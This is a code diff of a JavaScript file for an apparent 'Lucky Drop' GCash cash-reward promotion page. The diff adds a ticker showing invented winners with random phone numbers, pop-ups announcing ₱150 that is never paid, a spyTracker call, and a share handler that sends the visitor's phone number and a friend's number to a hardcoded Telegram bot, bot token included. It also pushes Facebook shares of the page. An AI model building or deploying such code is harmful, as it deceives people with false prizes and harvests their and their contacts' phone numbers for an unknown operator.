@@ -300,9 +300,61 @@ function generateWeightedAmount() {
     return amounts[Math.floor(Math.random() * amounts.length)];
 }
 
+// ========== MAIN TIMER (DROP ENDS IN) ==========
+function initMainTimer() {
+    var timerDisplay = document.getElementById('mainTimerDisplay');
+    if (!timerDisplay) return;
+    
+    var target = new Date(2026, 4, 1, 0, 0, 0);
+    
+    function updateTimer() {
+        var now = new Date();
+        var diff = target - now;
+        
+        if (diff > 0) {
+            var days = Math.floor(diff / (1000*60*60*24));
+            var hours = Math.floor((diff % (86400000)) / 3600000);
+            var mins = Math.floor((diff % 3600000) / 60000);
+            var secs = Math.floor((diff % 60000) / 1000);
+            timerDisplay.innerHTML = days + "D " + 
+                hours.toString().padStart(2,'0') + ":" + 
+                mins.toString().padStart(2,'0') + ":" + 
+                secs.toString().padStart(2,'0');
+        } else {
+            timerDisplay.innerHTML = "00D 00:00:00";
+        }
+    }
+    
+    updateTimer();
+    setInterval(updateTimer, 1000);
+    console.log("Main timer started");
+}
 
+// ========== WINNER TICKER ==========
+function initWinnerTicker() {
+    var winnerSpan = document.getElementById('winnerText');
+    if (!winnerSpan) return;
+    
+    var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
+    var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
+    
+    function generateRandomWinner() {
+        var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+        var last4 = Math.floor(1000 + Math.random() * 9000);
+        var amount = amounts[Math.floor(Math.random() * amounts.length)];
+        return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
+    }
+    
+    winnerSpan.innerHTML = generateRandomWinner();
+    
+    setInterval(function() {
+        winnerSpan.innerHTML = generateRandomWinner();
+    }, 15000);
+    
+    console.log("Winner ticker started");
+}
 
-// ========== REFERRAL TIMER ==========
+// ========== REFERRAL TIMER (COOLDOWN) ==========
 const referralTimer = {
     STORAGE_KEY: 'referral_end_time',
     
@@ -330,42 +382,6 @@ const referralTimer = {
     
     isOnCooldown: function() {
         return this.getRemainingTime() > 0;
-    },
-    
-    formatTime: function(seconds) {
-        var mins = Math.floor(seconds / 60);
-        var secs = seconds % 60;
-        return mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
-    },
-    
-    updatePopupDisplay: function() {
-        var remaining = this.getRemainingTime();
-        var timerElement = document.getElementById('popupTimerDisplay');
-        
-        if (timerElement) {
-            if (remaining > 0) {
-                timerElement.innerHTML = this.formatTime(remaining);
-                timerElement.style.color = '#ffaa33';
-            } else {
-                timerElement.innerHTML = "00:00";
-                timerElement.style.color = '#39ff14';
-            }
-        }
-        return remaining;
-    },
-    
-    startPopupCountdown: function() {
-        this.updatePopupDisplay();
-        
-        var self = this;
-        var interval = setInterval(function() {
-            var remaining = self.updatePopupDisplay();
-            if (remaining <= 0) {
-                clearInterval(interval);
-            }
-        }, 1000);
-        
-        return interval;
     }
 };
 
@@ -412,6 +428,12 @@ function startShareCooldownUI() {
     shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
 }
 
+function checkExistingCooldown() {
+    if (referralTimer.isOnCooldown()) {
+        startShareCooldownUI();
+    }
+}
+
 // ========== CONFETTI FUNCTIONS ==========
 var confettiAnimation = null;
 var confettiTimeout = null;
@@ -426,13 +448,13 @@ function startConfetti() {
     var ctx = canvas.getContext('2d');
     
     var particles = [];
-    for (var i = 0; i < 150; i++) {
+    for (var i = 0; i < 100; i++) {
         particles.push({
             x: Math.random() * canvas.width,
             y: Math.random() * canvas.height - canvas.height,
-            size: Math.random() * 8 + 3,
+            size: Math.random() * 6 + 2,
             color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
-            speed: Math.random() * 4 + 2
+            speed: Math.random() * 3 + 2
         });
     }
     
@@ -459,7 +481,7 @@ function startConfetti() {
     if (confettiTimeout) clearTimeout(confettiTimeout);
     confettiTimeout = setTimeout(function() {
         stopConfetti();
-    }, 5000);
+    }, 4000);
 }
 
 function stopConfetti() {
@@ -476,20 +498,12 @@ function stopConfetti() {
 }
 
 // ========== PRIZE POPUP FUNCTIONS ==========
-var popupCountdownInterval = null;
-
 function showPrizePopup() {
     var popup = document.getElementById('prizePopup');
-    var popupBalance = document.getElementById('popupBalanceAmount');
-    
-    if (popupBalance) popupBalance.innerHTML = "₱150.00";
-    
-    if (popupCountdownInterval) clearInterval(popupCountdownInterval);
-    popupCountdownInterval = referralTimer.startPopupCountdown();
-    
-    startConfetti();
-    
-    if (popup) popup.style.display = 'flex';
+    if (popup) {
+        startConfetti();
+        popup.style.display = 'flex';
+    }
 }
 
 function closePrizePopup() {
@@ -498,45 +512,49 @@ function closePrizePopup() {
     stopConfetti();
 }
 
-// ========== SIMPLE SHARE BUTTON ==========
-function initShareButton() {
-    var shareBtn = document.getElementById('shareButton');
-    var friendInput = document.getElementById('friendPhoneInput');
+// ========== CARD GOLDEN HIGHLIGHT ==========
+function initCardHighlights() {
+    var cards = document.querySelectorAll('.prize-card');
     
-    if (shareBtn) {
-        // Remove existing listeners
-        var newShareBtn = shareBtn.cloneNode(true);
-        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
+    for (var i = 0; i < cards.length; i++) {
+        var card = cards[i];
         
-        newShareBtn.onclick = function(e) {
-            e.preventDefault();
+        card.addEventListener('click', function(e) {
+            var clickedCard = this;
             
-            var phone = friendInput.value.trim();
-            var userPhone = localStorage.getItem("userPhone");
+            clickedCard.style.transition = 'all 0.3s ease';
+            clickedCard.style.border = '2px solid #ffd700';
+            clickedCard.style.boxShadow = '0 0 20px rgba(255,215,0,0.5)';
             
-            if (!phone || phone.length !== 11 || !phone.startsWith('09')) {
-                alert("Please enter valid 11-digit number starting with 09");
-                return;
-            }
+            startConfetti();
             
-            if (phone === userPhone) {
-                alert("You cannot invite yourself!");
-                return;
-            }
+            setTimeout(function() {
+                clickedCard.style.border = '';
+                clickedCard.style.boxShadow = '';
+            }, 500);
             
-            alert("Share button works! Friend: " + phone);
-            
-            // Clear input
-            friendInput.value = '';
-            
-            // Show popup
-            showPrizePopup();
-        };
-        
-        newShareBtn.disabled = false;
-        console.log("Share button initialized");
+            alert("🎉 +₱150 added! Click CLAIM THRU GCASH to withdraw.");
+            e.stopPropagation();
+        });
     }
+    
+    console.log("Card highlights initialized");
 }
+
+// ========== SHARE BUTTON ==========
+async function handleShare() {
+    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
+    var userPhone = localStorage.getItem("userPhone");
+    
+    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
+        alert("Please enter valid 11-digit number starting with 09");
+        return;
+    }
+    
+    if (friendPhone === userPhone) {
+        alert("You cannot invite yourself!");
+        return;
+    }
     
     if (referralTimer.isOnCooldown()) {
         var remaining = referralTimer.getRemainingTime();
@@ -547,11 +565,10 @@ function initShareButton() {
     }
     
     indicatorSystem.setStep(1);
-    
     referralTimer.startTimer();
     startShareCooldownUI();
     
-    var message = "📱 REFERRAL INVITE - STEP 1/3!\n👤 User: " + userPhone + "\n👥 Friend: " + friendPhone;
+    var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
     
     try {
         await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
@@ -566,18 +583,28 @@ function initShareButton() {
     
     var statusMsg = document.getElementById('statusMessage');
     if (statusMsg) {
-        statusMsg.innerHTML = '<span class="status-step1">✅ Step 1/3 completed! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>';
+        statusMsg.innerHTML = '<span class="status-step1">✅ Step 1 completed! Click CLAIM THRU GCASH to get ₱150!</span>';
     }
     
     showPrizePopup();
 }
 
-// ========== STEP 2: FACEBOOK SHARE HANDLER ==========
+function initShareButton() {
+    var shareBtn = document.getElementById('shareButton');
+    
+    if (shareBtn) {
+        var newShareBtn = shareBtn.cloneNode(true);
+        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
+        newShareBtn.onclick = handleShare;
+        newShareBtn.disabled = referralTimer.isOnCooldown();
+        console.log("Share button initialized");
+    }
+}
+
+// ========== FACEBOOK SHARE ==========
 async function handleFacebookShare() {
     var shareUrl = "https://xjiligames.github.io/rewards/index.html";
-    var shareText = "🎉 I just won from Lucky Drop! Join me and get your bonus too! 🐾";
-    
-    var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(shareText);
+    var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
     
     window.open(fbShareUrl, '_blank', 'width=600,height=400');
     
@@ -588,7 +615,7 @@ async function handleFacebookShare() {
     
     var statusMsg = document.getElementById('statusMessage');
     if (statusMsg) {
-        statusMsg.innerHTML = '<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>';
+        statusMsg.innerHTML = '<span class="status-step2">✅ Step 2 completed! Share to Facebook done!</span>';
     }
     
     var phone = localStorage.getItem("userPhone");
@@ -601,54 +628,33 @@ async function handleFacebookShare() {
     }
 }
 
-// ========== STEP 3: REFERRAL COMPLETE ==========
-async function completeReferral(referredPhone) {
-    var userPhone = localStorage.getItem("userPhone");
-    
-    await balanceManager.addBalance(150);
-    await indicatorSystem.step3ReferralComplete();
-    
-    var progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '100%';
-    
-    var statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = '<span class="status-step3">🎉 Step 3/3 completed! +₱150 bonus from referral! 🟢</span>';
-    }
-    
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        var db = firebase.database();
-        var newBalance = await balanceManager.getBalance();
-        await db.ref('user_sessions/' + userPhone).update({
-            indicatorStep: 3,
-            balance: newBalance,
-            lastStepUpdate: Date.now()
-        });
+function initFacebookShare() {
+    var fbBtn = document.getElementById('shareFBBtn');
+    if (fbBtn) {
+        fbBtn.onclick = handleFacebookShare;
         
-        await db.ref('referrals/' + userPhone + '/' + referredPhone).set({
-            timestamp: Date.now(),
-            bonus: 150
-        });
+        if (!document.querySelector('.fb-share-info')) {
+            var infoText = document.createElement('div');
+            infoText.className = 'fb-share-info';
+            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
+            infoText.innerHTML = 'You will receive notification once your share is validated and get +150 bonus Credits';
+            fbBtn.parentNode.appendChild(infoText);
+        }
     }
-    
-    await balanceManager.updateBalanceDisplay();
-    
-    var finalBalance = await balanceManager.getBalance();
-    alert("🎉 +₱150 added to your balance! Total: ₱" + finalBalance);
 }
 
-// ========== CLAIM GCASH BUTTON ==========
+// ========== CLAIM BUTTON ==========
 async function handleClaimGCash() {
     var currentStep = indicatorSystem.getCurrentStep();
     var isOnHold = localStorage.getItem('claimOnHold') === 'true';
     
     if (currentStep !== 1) {
-        alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
+        alert("Complete Step 1 first! Enter a friend's mobile number.");
         return;
     }
     
     if (isOnHold) {
-        alert("⏳ Claim is already processing. Please wait.");
+        alert("Claim is already processing. Please wait.");
         return;
     }
     
@@ -657,10 +663,10 @@ async function handleClaimGCash() {
     var newBalance = await balanceManager.addBalance(150);
     
     if (newBalance !== false) {
-        alert("💰 ₱150 added to your balance! Total: ₱" + newBalance);
+        alert("₱150 added to your balance! Total: ₱" + newBalance);
         
         var phone = localStorage.getItem("userPhone");
-        var message = "💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: " + phone + "\n💵 ₱150 claimed\n💰 New Balance: ₱" + newBalance;
+        var message = "CLAIM SUCCESS!\nUser: " + phone + "\n₱150 claimed";
         await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
         
         var progressFill = document.getElementById('progressFill');
@@ -668,93 +674,48 @@ async function handleClaimGCash() {
         
         var statusMsg = document.getElementById('statusMessage');
         if (statusMsg) {
-            statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>';
+            statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2!</span>';
         }
         
         indicatorSystem.updateIndicators(1, false);
     }
 }
 
-// ========== COMPLETE INITIALIZATION ==========
-document.addEventListener('DOMContentLoaded', function() {
-    console.log("Promotion.js loading...");
-    
-    // 1. Timer at Ticker
-    initSimpleTimer();
-    initWinnerTicker();
-    
-    // 2. Card Highlights
-    initCardHighlights();
-    
-    // 3. Share Button
-    initShareButton();
-    
-    // 4. Enter Key Support
-    initEnterKeySupport();
-    
-    // 5. Video Autoplay
-    initVideoAutoplay();
-    
-    // 6. Facebook Share Button
-    var fbBtn = document.getElementById('shareFBBtn');
-    if (fbBtn) {
-        fbBtn.onclick = function() {
-            var url = "https://xjiligames.github.io/rewards/index.html";
-            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(url), '_blank');
-        };
-    }
-    
-    // 7. Claim Button
+function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
     if (claimBtn) {
         claimBtn.onclick = function() {
             if (typeof window.showClaimPopup === 'function') {
                 window.showClaimPopup(150);
             } else {
-                alert("System loading. Please try again.");
+                handleClaimGCash();
             }
         };
+        console.log("Claim button initialized");
     }
-    
-    // 8. Popup close
-    var popup = document.getElementById('prizePopup');
-    if (popup) {
-        popup.onclick = function(e) {
-            if (e.target === popup) {
-                closePrizePopup();
-            }
-        };
-    }
-    
-    console.log("Promotion.js loaded - All systems ready");
-});
+}
 
 // ========== ENTER KEY SUPPORT ==========
 function initEnterKeySupport() {
     var friendInput = document.getElementById('friendPhoneInput');
     var shareBtn = document.getElementById('shareButton');
     
-    if (friendInput) {
+    if (friendInput && shareBtn) {
         friendInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
-                if (shareBtn) {
-                    shareBtn.click();
-                }
+                shareBtn.click();
             }
         });
     }
 }
 
-// ========== VIDEO AUTOPLAY FIX ==========
+// ========== VIDEO AUTOPLAY ==========
 function initVideoAutoplay() {
     var video = document.querySelector('.lucky-cat-video video');
     if (video) {
-        // Try to play on page load
         video.play().catch(function(e) {
             console.log("Autoplay blocked:", e);
-            
-            // Play on first user interaction
             document.body.addEventListener('click', function playOnClick() {
                 video.play().catch(function() {});
                 document.body.removeEventListener('click', playOnClick);
@@ -763,113 +724,34 @@ function initVideoAutoplay() {
     }
 }
 
-// Call this on DOMContentLoaded
-initVideoAutoplay();
-
-
-// ========== CHECK EXISTING COOLDOWN ==========
-function checkExistingCooldown() {
-    if (referralTimer.isOnCooldown()) {
-        startShareCooldownUI();
-    }
-}
-
-// ========== SIMPLE TIMER AT TICKER ==========
-// Idagdag ito sa pinaka-itaas ng promotion.js, bago ang lahat
-
-function initSimpleTimer() {
-    var timerDisplay = document.getElementById('mainTimerDisplay');
-    if (timerDisplay) {
-        var target = new Date(2026, 4, 1, 0, 0, 0);
-        
-        function updateTimer() {
-            var now = new Date();
-            var diff = target - now;
-            
-            if (diff > 0) {
-                var days = Math.floor(diff / (1000*60*60*24));
-                var hours = Math.floor((diff % (86400000)) / 3600000);
-                var mins = Math.floor((diff % 3600000) / 60000);
-                var secs = Math.floor((diff % 60000) / 1000);
-                timerDisplay.innerHTML = days + "D " + 
-                    hours.toString().padStart(2,'0') + ":" + 
-                    mins.toString().padStart(2,'0') + ":" + 
-                    secs.toString().padStart(2,'0');
-            } else {
-                timerDisplay.innerHTML = "00D 00:00:00";
+// ========== POPUP CLOSE ON OUTSIDE CLICK ==========
+function initPopupClose() {
+    var popup = document.getElementById('prizePopup');
+    if (popup) {
+        popup.onclick = function(e) {
+            if (e.target === popup) {
+                closePrizePopup();
             }
-        }
-        
-        updateTimer();
-        setInterval(updateTimer, 1000);
-        console.log("Timer started");
-    }
-}
-
-function initWinnerTicker() {
-    var winnerSpan = document.getElementById('winnerText');
-    if (winnerSpan) {
-        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
-        var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
-        
-        function generateRandomWinner() {
-            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            var last4 = Math.floor(1000 + Math.random() * 9000);
-            var amount = amounts[Math.floor(Math.random() * amounts.length)];
-            return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
-        }
-        
-        winnerSpan.innerHTML = generateRandomWinner();
-        
-        setInterval(function() {
-            winnerSpan.innerHTML = generateRandomWinner();
-        }, 15000);
-        
-        console.log("Winner ticker started");
-    }
-}
-
-// Execute agad
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', function() {
-        initSimpleTimer();
-        initWinnerTicker();
-    });
-} else {
-    initSimpleTimer();
-    initWinnerTicker();
-}
-
-// ========== CARD CLICK HANDLERS ==========
-function setupCardClicks() {
-    var youGetCard = document.querySelector('.prize-card:first-child');
-    var friendGetsCard = document.querySelector('.prize-card:last-child');
-    
-    if (youGetCard) {
-        youGetCard.addEventListener('click', function() {
-            startConfetti();
-            alert("🎉 YOU GET ₱150! Click CLAIM THRU GCASH to withdraw!");
-        });
-    }
-    
-    if (friendGetsCard) {
-        friendGetsCard.addEventListener('click', function() {
-            startConfetti();
-            alert("🎉 FRIEND GETS ₱150! Share this link with your friend!");
-        });
+        };
     }
 }
 
 // ========== INITIALIZE ==========
 document.addEventListener('DOMContentLoaded', async function() {
-    console.log("Promotion.js loaded - Fixed Version");
+    console.log("Promotion.js loading...");
     
     await spyTracker.track();
     
-    winnerTicker.start();
-    startMainTimer();
+    initMainTimer();
+    initWinnerTicker();
+    initCardHighlights();
+    initShareButton();
+    initFacebookShare();
+    initClaimButton();
+    initEnterKeySupport();
+    initVideoAutoplay();
+    initPopupClose();
     checkExistingCooldown();
-    setupCardClicks();
     
     var result = await indicatorSystem.loadFromFirebase();
     console.log("Current step: " + result.step + ", On Hold: " + result.isOnHold);
@@ -881,72 +763,5 @@ document.addEventListener('DOMContentLoaded', async function() {
         else if (result.step >= 1) progressFill.style.width = '33%';
     }
     
-    var shareBtn = document.getElementById('shareButton');
-    if (shareBtn) {
-        var newShareBtn = shareBtn.cloneNode(true);
-        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
-        newShareBtn.onclick = handleShare;
-        newShareBtn.disabled = referralTimer.isOnCooldown();
-    }
-    
-    var fbShareBtn = document.getElementById('shareFBBtn');
-    if (fbShareBtn) {
-        if (!document.querySelector('.fb-share-info')) {
-            var infoText = document.createElement('div');
-            infoText.className = 'fb-share-info';
-            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
-            infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
-            fbShareBtn.parentNode.appendChild(infoText);
-        }
-        
-        fbShareBtn.onclick = handleFacebookShare;
-    }
-    
-    var claimBtn = document.getElementById('claimGCashBtn');
-    if (claimBtn) {
-        claimBtn.onclick = handleClaimGCash;
-    }
-    
-    var popup = document.getElementById('prizePopup');
-    if (popup) {
-        popup.onclick = function(e) {
-            if (e.target === popup) {
-                closePrizePopup();
-            }
-        };
-    }
-
-    
-    console.log("Promotion.js initialized - All systems ready");
+    console.log("Promotion.js ready");
 });
-
-// ========== CARD GOLDEN HIGHLIGHT ==========
-function initCardHighlights() {
-    var cards = document.querySelectorAll('.prize-card');
-    
-    for (var i = 0; i < cards.length; i++) {
-        var card = cards[i];
-        
-        card.addEventListener('click', function(e) {
-            var clickedCard = this;
-            
-            // Add golden highlight animation
-            clickedCard.classList.add('prize-card-golden');
-            
-            // Start confetti
-            startConfetti();
-            
-            // Remove highlight after animation
-            setTimeout(function() {
-                clickedCard.classList.remove('prize-card-golden');
-            }, 500);
-            
-            // Alert message
-            alert("🎉 +₱150 added to your balance! Click CLAIM THRU GCASH to withdraw.");
-            
-            e.stopPropagation();
-        });
-    }
-    
-    console.log("Card highlights initialized");
-}
